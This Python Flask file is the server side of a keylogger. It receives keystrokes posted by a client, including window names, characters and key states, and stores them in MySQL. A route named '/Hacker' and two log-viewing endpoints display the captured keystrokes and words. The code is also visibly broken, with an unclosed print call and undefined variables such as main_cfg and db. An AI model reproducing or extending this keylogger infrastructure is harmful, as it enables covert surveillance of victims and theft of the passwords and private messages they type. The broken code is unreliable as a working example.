from flask import Flask, render_template, request, make_response, jsonify
import json
from json import JSONEncoder
import mysql.connector
from datetime import datetime
from process import Process
from load_config import db_cursor

#start flask app
app = Flask(__name__, template_folder='templates')

    
def datetime_converter(o):
  if isinstance(o,datetime):
      return o.__str__()
    
@app.route('/')
def hello():
    return render_template('index.html')

@app.route('/pushKeys', methods=['POST'])
def addLog():
  data = json.loads(request.data)
  # Process.separateBreakChar(data)

  for key in range(len(data)):      
    try:
      print(data[str(key)].get('isKeyDown')
      pushDB_keys(json.loads(data[str(key)]))
      
      

    except Exception as e:
      print("Exception:",e)

      return make_response(jsonify({'response': 'Fail', 'code':500}), 500)
  
  return make_response(jsonify({'response': 'Success', 'code':200}), 200)


def pushDB_keys(payload):
  # main_cfg = load_cfg('./main_cfg.json')

  # db = mysql.connector.connect (
  #   host=main_cfg['dbHost'],
  #   port=main_cfg['port'],
  #   user=main_cfg['sqlUser'],
  #   password=main_cfg['sqlPass'],
  #   database=main_cfg['db']
  # )
  
  # mycursor = db.cursor()
  if (payload['isKeyDown'] == 1):
    Process.separateBreakChar(payload)
    
  mycursor = db_cursor()
  
  sql = f"INSERT INTO {main_cfg['dbKeyTable']} {main_cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s,%s, %s, %s)"
  val = (f"{payload['datetime']}", f"{payload['epochTime']}", f"{payload['isKeyDown']}", f"{payload['windowName']}", f"{payload['asciiCode']}", f"{payload['asciiChar']}", f"{payload['keyName']}", f"{payload['isCaps']}", f"{payload['processedKey']}")
  
  mycursor.execute(sql, val)
  
  db.commit()
  return 0 

@app.route('/Hacker', methods=['GET'])
def showKeylog():
  return render_template('base.html')

@app.route('/showKeylog', methods=['GET'])
def pushKeylog():
  main_cfg = load_cfg('./main_cfg.json')
  res = {}

  db = mysql.connector.connect (
    host=main_cfg['dbHost'],
    port=main_cfg['port'],
    user=main_cfg['sqlUser'],
    password=main_cfg['sqlPass'],
    database=main_cfg['db']
  )
  
  mycursor = db.cursor()
  
  sql = f"SELECT * FROM {main_cfg['dbKeyTable']}"
  mycursor.execute(sql)
  res_query = [dict((mycursor.description[i][0],value) for i, value in enumerate(row)) for row in mycursor.fetchall()]
  res = json.dumps(res_query, default=datetime_converter)
 # print(res)

  return res

@app.route('/showWordlog', methods=['GET'])
def pushWordlog():
  # main_cfg = load_cfg('./main_cfg.json')
  # res = {}

  # db = mysql.connector.connect (
  #   host=main_cfg['dbHost'],
  #   port=main_cfg['port'],
  #   user=main_cfg['sqlUser'],
  #   password=main_cfg['sqlPass'],
  #   database=main_cfg['db']
  # )
  
  # mycursor = db.cursor()
  mycursor = db_cursor()
  
  sql = f"SELECT * FROM {main_cfg['dbWordTable']}"
  mycursor.execute(sql)
  res_query = [dict((mycursor.description[i][0],value) for i, value in enumerate(row)) for row in mycursor.fetchall()]
  res = json.dumps(res_query, default=datetime_converter)
  print(res)

  return res
  
  

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int("443"), debug=True)
    #app.run(debug=True)
